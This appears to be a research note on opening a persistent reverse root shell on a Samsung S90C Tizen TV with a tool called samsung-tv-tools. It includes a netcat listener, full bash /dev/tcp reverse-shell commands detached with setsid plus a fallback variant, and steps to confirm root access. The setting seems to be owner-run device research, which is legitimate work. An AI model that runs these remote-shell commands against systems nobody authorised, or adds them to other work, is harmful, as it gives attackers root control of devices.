# Persistent reverse root shell

Scope: Samsung S90C on Tizen 9 build
`T-PTMCAKUC-0090-REL-202603190200`, using
`invaliddayta/samsung-tv-tools`.

The `tv-access` command runner is intentionally bounded. If an interactive
reverse Bash process remains in its process group, the command eventually times
out and kills that process group. The symptom is a working `bash-3.2#` prompt
that later drops back to the Docker host.

Launch the reverse shell in a new session and let the bounded command return.

## Listener

On the trusted Linux controller:

```sh
nc -lvnp 4444
```

Port 4444 is only an example. The listener is unauthenticated; expose it only on
a trusted network and close it when the session ends.

## Detached TV callback

In a second controller terminal:

```sh
cd /path/to/samsung-tv-tools
export TV_HOST=TV_IP_ADDRESS

nix --extra-experimental-features 'nix-command flakes' \
    run .#tv-access -- \
    "/usr/bin/setsid -f /usr/bin/bash -c 'exec 5<>/dev/tcp/CONTROLLER_IP/4444; exec /usr/bin/bash -i <&5 >&5 2>&5' </dev/null >/dev/null 2>&1"
```

For the tested network, the addresses were:

- TV: `172.16.40.13`
- controller callback address: `172.16.10.5`

The `setsid -f` child has a separate session, and all inherited standard file
descriptors are disconnected before Bash attaches them to the TCP socket.
Consequently, `tv-access` can finish normally without retaining or later
killing the interactive shell.

## Verification

Run these at the listener's `bash-3.2#` prompt:

```sh
id
hostname
echo $$
ps -o pid,ppid,pgid,sid,cmd -p $$
```

The tested shell should report UID/GID 0. A prompt such as
`cseivert@docker:~$` is the controller, not the TV; TV-only commands such as
`pkgcmd` will not exist there.

## Fallback

If the installed `setsid` does not accept `-f`:

```sh
nix --extra-experimental-features 'nix-command flakes' \
    run .#tv-access -- \
    "/usr/bin/bash -c '/usr/bin/setsid /usr/bin/bash -c '\''exec 5<>/dev/tcp/CONTROLLER_IP/4444; exec /usr/bin/bash -i <&5 >&5 2>&5'\'' </dev/null >/dev/null 2>&1 &'"
```

## Terminal behavior

The basic reverse shell prints `bash: no job control in this shell`. That is
expected and is adequate for package inspection and bounded commands. The
installed `script` utility can allocate a PTY, but it is optional and adds
local terminal-state handling.

Do not leave `set -e` enabled in the interactive research shell. A typo,
failed probe, or pasted command boundary will then exit the entire shell. Prefer
short commands, paste them one at a time, and use explicit `|| true` only where
failure is expected. Run a strict multi-step operation inside a subshell if
needed:

```sh
(
    set -e
    command_one
    command_two
)
```

A documented session ended when adjacent pasted text changed `|| true` and the
next `set -e` into the invalid command `trueset -e`. This was a shell-option
exit, not a failure of the detached `setsid` session.

Exit deliberately with:

```sh
exit
```

If the controller terminal is left in an unusual mode after a PTY experiment:

```sh
stty sane
reset
```

This is a manual research shell, not an authenticated persistent management
service. It ends on explicit exit, network loss, TV shutdown, or reboot.
